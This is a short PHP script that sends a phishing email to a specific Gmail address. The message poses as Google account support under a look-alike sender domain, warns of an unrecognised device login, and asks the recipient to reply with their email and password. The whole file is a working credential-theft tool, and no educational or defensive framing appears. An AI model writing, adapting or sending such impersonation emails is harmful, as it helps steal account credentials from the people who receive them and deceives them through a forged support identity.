<?php
$to = "leeteamin@gmail.com";
$subject = "[URGENT] New Device Login Request";
$txt = "Hello, this is to inform you that someone or maybe you tried to login into your account using other device which wasn't registered. To avoid any issue kindly reply with your email and password so that our team can look into the matter and maximise the security.
<br>
Regards,<br>
Support Team ";
$headers = "mail support <gmailsupport@gsupportrequest.com>"."\r\n";


mail($to,$subject,$txt,$headers);
?>